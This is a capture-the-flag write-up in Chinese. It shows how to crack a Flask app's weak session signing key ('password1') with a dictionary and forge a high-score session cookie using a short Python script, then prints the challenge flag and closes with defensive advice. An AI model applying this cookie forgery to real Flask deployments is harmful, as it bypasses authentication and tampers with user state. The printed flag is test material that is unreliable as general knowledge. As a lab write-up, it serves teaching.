# rescuing inspector gadget

## 题目简述

应用把算术题答案与累计分数保存在 Flask 客户端会话 Cookie 中，分数达到 5,000,000 后直接返回 Flag。Cookie 虽有签名，但密钥弱且可由附件字典匹配；得到密钥后即可伪造高分会话，无需逐题识图计算。

## 解题过程

路由只在会话缺少 `ans` 时初始化新题；否则直接检查 `session['score']`。因此伪造结构必须同时包含 `ans`、`question` 和足够高的 `score`：

```python
from flask.sessions import SecureCookieSessionInterface

class MockApp:
    secret_key = "password1"

serializer = SecureCookieSessionInterface().get_signing_serializer(MockApp())
cookie = serializer.dumps({
    "ans": 0,
    "question": "0+0",
    "score": 100000000,
})
print(cookie)
```

若只拿到线上会话而不知道密钥，可先用附件 `dict.txt` 对候选密钥逐个签名，或用 `flask-unsign` 验签；官方解法恢复到 `password1`。把生成值设置为目标站点的 `session` Cookie 后请求首页，服务端会信任其中的高分并输出：

```text
greyhats{r1p_l4mbd4_fa123734fa}
```

伪造时应使用与题目 Flask 版本相同的序列化方式，不能只把 JSON 做 Base64；签名盐、摘要算法和压缩标记都由 Flask 会话序列化器处理。

## 方法总结

客户端会话可以保存状态，但其完整性完全依赖签名密钥。短弱密钥一旦被字典匹配，攻击者不仅能读会话，还能任意修改分数和身份。服务端应使用高熵随机密钥，并且不能把“客户端可控分数达到阈值”当作唯一授权依据。
